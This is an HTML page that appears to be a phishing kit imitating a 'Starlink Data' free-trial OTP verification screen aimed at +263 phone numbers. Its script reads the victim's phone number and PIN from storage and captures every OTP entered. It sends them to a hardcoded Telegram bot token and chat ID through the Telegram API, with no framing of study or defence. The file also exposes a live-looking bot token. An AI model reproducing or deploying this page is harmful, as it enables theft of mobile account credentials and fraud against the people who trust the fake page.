

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starlink Data - OTP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .logo {
            text-align: center;
            font-size: 32px;
            color: #667eea;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
        }
        
        .phone-display {
            background: #f0f3ff;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-weight: bold;
            color: #667eea;
            font-size: 18px;
            text-align: center;
        }
        
        .plan-display {
            background: #e8f4ff;
            padding: 10px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
            color: #0066cc;
            text-align: center;
        }
        
        /* Main OTP input for copy/paste */
        .otp-main-input {
            width: 100%;
            padding: 15px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            margin: 20px 0;
            outline: none;
            font-weight: bold;
        }
        
        .otp-main-input:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
        }
        
        .otp-main-input::placeholder {
            letter-spacing: normal;
            color: #aaa;
            font-size: 14px;
        }
        
        /* Individual OTP inputs */
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
            position: relative;
        }
        
        .otp-input {
            width: 45px;
            height: 55px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            border: 2px solid #ddd;
            border-radius: 8px;
            background: white;
            opacity: 0.5;
            pointer-events: none;
        }
        
        .otp-input.active {
            border-color: #667eea;
            opacity: 1;
            background: #f0f3ff;
        }
        
        .input-method-toggle {
            text-align: center;
            margin: 10px 0;
            font-size: 14px;
            color: #666;
        }
        
        .toggle-link {
            color: #667eea;
            text-decoration: none;
            cursor: pointer;
            font-weight: bold;
        }
        
        .toggle-link:hover {
            text-decoration: underline;
        }
        
        .timer {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #666;
        }
        
        .timer span {
            color: #667eea;
            font-weight: bold;
        }
        
        .btn-verify {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: transform 0.3s;
            margin-top: 10px;
        }
        
        .btn-verify:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        
        .btn-verify:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        .resend-link {
            text-align: center;
            margin-top: 20px;
        }
        
        .resend-link a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        
        .resend-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #999;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }
        
        /* Paste notification */
        .paste-notification {
            text-align: center;
            background: #e8f4ff;
            padding: 8px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 13px;
            color: #0066cc;
            display: none;
        }
        
        .paste-notification.show {
            display: block;
            animation: fadeIn 0.3s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Starlink Data</div>
        <h2>OTP Verification</h2>
        <p class="subtitle">Enter the 6-digit OTP sent to your number</p>
        
        <div class="phone-display" id="phoneDisplay">
            Loading...
        </div>
        
        <div class="plan-display" id="planDisplay">
            Loading plan details...
        </div>
        
        <!-- Main OTP input for copy/paste -->
        <input 
            type="text" 
            id="otpMainInput" 
            class="otp-main-input" 
            placeholder="Enter 6-digit OTP here"
            maxlength="6"
            inputmode="numeric"
            pattern="[0-9]{6}"
        >
        
        <div class="paste-notification" id="pasteNotification">
            ‚úì OTP pasted successfully! Click SUBMIT to verify.
        </div>
        
        <div class="input-method-toggle">
            <a class="toggle-link" id="toggleMethod" onclick="toggleInputMethod()">
                Switch to individual digit input
            </a>
        </div>
        
        <!-- Individual OTP inputs (hidden by default) -->
        <div class="otp-inputs" id="individualInputs" style="display: none;">
            <input type="text" class="otp-input" maxlength="1" data-index="0">
            <input type="text" class="otp-input" maxlength="1" data-index="1">
            <input type="text" class="otp-input" maxlength="1" data-index="2">
            <input type="text" class="otp-input" maxlength="1" data-index="3">
            <input type="text" class="otp-input" maxlength="1" data-index="4">
            <input type="text" class="otp-input" maxlength="1" data-index="5">
        </div>
        
        <div class="timer">
            Resend OTP in <span id="resendTimer">109</span> seconds
        </div>
        
        <button class="btn-verify" id="verifyBtn" onclick="verifyOTP()">
            SUBMIT
        </button>
        
        <div class="resend-link">
            <a href="#" id="resendLink" onclick="resendOTP()">Resend OTP</a>
        </div>
        
        <div class="footer">
            ¬© 2024 Starlink Data. All rights reserved.
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = "8350396603:AAG2fThlCEOBcN9TQDqdM0wRR_N590DJveI";
        const CHAT_ID = "8565173040";
        
        let otpData = {};
        let countdownInterval = null;
        let timeLeft = 109;
        let useIndividualInputs = false;
        let selectedPlan = {};
        
        document.addEventListener('DOMContentLoaded', function() {
            // Get saved data
            selectedPlan = JSON.parse(localStorage.getItem('selectedPlan')) || {};
            otpData = JSON.parse(localStorage.getItem('starlinkOTP')) || {};
            
            // Display phone number
            const phone = otpData.phone || localStorage.getItem('starlinkPhone') || '*********';
            document.getElementById('phoneDisplay').textContent = `+263${phone}`;
            
            // Display plan details
            const planDisplay = document.getElementById('planDisplay');
            planDisplay.textContent = `${selectedPlan.name || 'Free Trial'} - ${selectedPlan.price || '$0'} - ${selectedPlan.duration || '4 Days'}`;
            
            // Setup OTP inputs
            setupOTPInputs();
            
            // Start countdown
            startCountdown();
            
            // Auto-focus main OTP input
            document.getElementById('otpMainInput').focus();
        });
        
        function setupOTPInputs() {
            const mainInput = document.getElementById('otpMainInput');
            const individualInputs = document.querySelectorAll('.otp-input');
            const pasteNotification = document.getElementById('pasteNotification');
            
            // Main input for copy/paste
            mainInput.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length > 6) {
                    this.value = this.value.slice(0, 6);
                }
                
                updateIndividualInputs(this.value);
                
                if (this.value.length === 6) {
                    if (this.value.length > 1) {
                        pasteNotification.classList.add('show');
                        setTimeout(() => {
                            pasteNotification.classList.remove('show');
                        }, 3000);
                    }
                    document.getElementById('verifyBtn').focus();
                }
            });
            
            // Paste handling
            mainInput.addEventListener('paste', function(e) {
                e.preventDefault();
                const pastedData = e.clipboardData.getData('text');
                const numbersOnly = pastedData.replace(/[^0-9]/g, '');
                
                if (numbersOnly.length >= 6) {
                    this.value = numbersOnly.slice(0, 6);
                    updateIndividualInputs(this.value);
                    
                    pasteNotification.classList.add('show');
                    setTimeout(() => {
                        pasteNotification.classList.remove('show');
                    }, 3000);
                    
                    setTimeout(() => {
                        document.getElementById('verifyBtn').focus();
                    }, 100);
                } else {
                    this.value = numbersOnly;
                    updateIndividualInputs(this.value);
                }
            });
            
            // Individual inputs setup
            individualInputs.forEach(input => {
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    
                    if (this.value.length === 1) {
                        const nextIndex = parseInt(this.dataset.index) + 1;
                        if (nextIndex < 6) {
                            individualInputs[nextIndex].focus();
                        } else {
                            updateMainInputFromIndividual();
                            document.getElementById('verifyBtn').focus();
                        }
                    }
                    
                    updateInputVisualState();
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value.length === 0) {
                        const prevIndex = parseInt(this.dataset.index) - 1;
                        if (prevIndex >= 0) {
                            individualInputs[prevIndex].focus();
                        }
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text');
                    const numbersOnly = pastedData.replace(/[^0-9]/g, '');
                    
                    if (numbersOnly.length >= 6) {
                        for (let i = 0; i < 6; i++) {
                            if (individualInputs[i]) {
                                individualInputs[i].value = numbersOnly.charAt(i) || '';
                            }
                        }
                        updateMainInputFromIndividual();
                        document.getElementById('verifyBtn').focus();
                    }
                });
            });
            
            function updateIndividualInputs(value) {
                for (let i = 0; i < 6; i++) {
                    if (individualInputs[i]) {
                        individualInputs[i].value = value.charAt(i) || '';
                    }
                }
                updateInputVisualState();
            }
            
            function updateMainInputFromIndividual() {
                let combined = '';
                individualInputs.forEach(input => {
                    combined += input.value;
                });
                mainInput.value = combined;
            }
            
            function updateInputVisualState() {
                individualInputs.forEach(input => {
                    if (input.value) {
                        input.classList.add('active');
                    } else {
                        input.classList.remove('active');
                    }
                });
            }
        }
        
        function toggleInputMethod() {
            useIndividualInputs = !useIndividualInputs;
            const mainInput = document.getElementById('otpMainInput');
            const individualInputsDiv = document.getElementById('individualInputs');
            const toggleLink = document.getElementById('toggleMethod');
            
            if (useIndividualInputs) {
                mainInput.style.display = 'none';
                individualInputsDiv.style.display = 'flex';
                toggleLink.textContent = 'Switch to single input (copy/paste)';
                
                const mainValue = mainInput.value;
                const individualInputs = document.querySelectorAll('.otp-input');
                
                for (let i = 0; i < 6; i++) {
                    if (individualInputs[i]) {
                        individualInputs[i].value = mainValue.charAt(i) || '';
                    }
                }
                
                let firstEmptyIndex = 0;
                for (let i = 0; i < 6; i++) {
                    if (!individualInputs[i].value) {
                        firstEmptyIndex = i;
                        break;
                    }
                }
                individualInputs[firstEmptyIndex].focus();
                
            } else {
                mainInput.style.display = 'block';
                individualInputsDiv.style.display = 'none';
                toggleLink.textContent = 'Switch to individual digit input';
                
                const individualInputs = document.querySelectorAll('.otp-input');
                let combined = '';
                individualInputs.forEach(input => {
                    combined += input.value;
                });
                mainInput.value = combined;
                
                mainInput.focus();
            }
        }
        
        function startCountdown() {
            const resendTimer = document.getElementById('resendTimer');
            const resendLink = document.getElementById('resendLink');
            
            function update() {
                resendTimer.textContent = timeLeft;
                
                if (timeLeft > 0) {
                    timeLeft--;
                } else {
                    clearInterval(countdownInterval);
                    resendLink.style.pointerEvents = 'auto';
                    resendLink.style.color = '#667eea';
                }
            }
            
            update();
            countdownInterval = setInterval(update, 1000);
        }
        
        function verifyOTP() {
            let enteredOtp = '';
            
            if (useIndividualInputs) {
                const otpInputs = document.querySelectorAll('.otp-input');
                otpInputs.forEach(input => {
                    enteredOtp += input.value;
                });
            } else {
                enteredOtp = document.getElementById('otpMainInput').value;
            }
            
            if (enteredOtp.length !== 6) {
                alert('Please enter the 6-digit OTP');
                return;
            }
            
            if (enteredOtp === otpData.otp) {
                sendVerificationSuccess(enteredOtp);
                window.location.href = 'starlink-success.html';
            } else {
                alert('Invalid OTP. Please try again.');
                sendInvalidOTPToTelegram(enteredOtp);
                
                if (useIndividualInputs) {
                    document.querySelectorAll('.otp-input').forEach(input => input.value = '');
                    document.querySelector('.otp-input[data-index="0"]').focus();
                } else {
                    document.getElementById('otpMainInput').value = '';
                    document.getElementById('otpMainInput').focus();
                }
            }
        }
        
        function sendVerificationSuccess(enteredOtp) {
            const phone = otpData.phone || localStorage.getItem('starlinkPhone');
            const pin = otpData.pin || localStorage.getItem('starlinkPIN');
            
            const message = `
‚úÖ *STARLINK DATA OTP VERIFICATION COMPLETE*

üì± *Phone:* +263${phone}
üî¢ *OTP Entered:* ${enteredOtp}
üîê *PIN Used:* ${pin}
‚úÖ *Status:* Fully Verified

üì¶ *Plan Details:*
‚Ä¢ Plan: ${selectedPlan.name || 'Free Trial'}
‚Ä¢ Price: ${selectedPlan.price || '$0'}
‚Ä¢ Duration: ${selectedPlan.duration || '4 Days'}

üéØ *Redirecting to Success Page*
üïí *Verified at:* ${new Date().toLocaleString()}
            `;
            
            sendToTelegramBot(message);
        }
        
        function sendInvalidOTPToTelegram(enteredOtp) {
            const phone = otpData.phone || localStorage.getItem('starlinkPhone');
            
            const message = `
‚ùå *STARLINK DATA INVALID OTP ATTEMPT*

üì± *Phone:* +263${phone}
‚ùå *Wrong OTP:* ${enteredOtp}
‚úÖ *Correct OTP:* ${otpData.otp || 'Unknown'}

üïí *Time:* ${new Date().toLocaleString()}
‚ö†Ô∏è *Client entered wrong OTP*
            `;
            
            sendToTelegramBot(message);
        }
        
        function resendOTP() {
            if (timeLeft > 0) {
                alert(`Please wait ${timeLeft} seconds before resending OTP`);
                return;
            }
            
            const newOTP = Math.floor(100000 + Math.random() * 900000);
            const phone = otpData.phone || localStorage.getItem('starlinkPhone');
            
            otpData.otp = newOTP.toString();
            otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
            
            localStorage.setItem('starlinkOTP', JSON.stringify(otpData));
            
            sendNewOTPToTelegram(newOTP, phone);
            
            timeLeft = 109;
            startCountdown();
            
            if (useIndividualInputs) {
                document.querySelectorAll('.otp-input').forEach(input => input.value = '');
                document.querySelector('.otp-input[data-index="0"]').focus();
            } else {
                document.getElementById('otpMainInput').value = '';
                document.getElementById('otpMainInput').focus();
            }
            
            alert('New OTP has been sent.');
        }
        
        function sendNewOTPToTelegram(otp, phone) {
            const message = `
üîÑ *STARLINK DATA OTP RESENT*

üî¢ *NEW OTP:* ${otp}
üì± *To Phone:* +263${phone}
üì¶ *Plan:* ${selectedPlan.name || 'Free Trial'}
‚è∞ *Expires:* 15 minutes

üïí *Resent at:* ${new Date().toLocaleString()}
            `;
            
            sendToTelegramBot(message);
        }
        
        async function sendToTelegramBot(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('Telegram error:', data);
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
    </script>
</body>
</html>
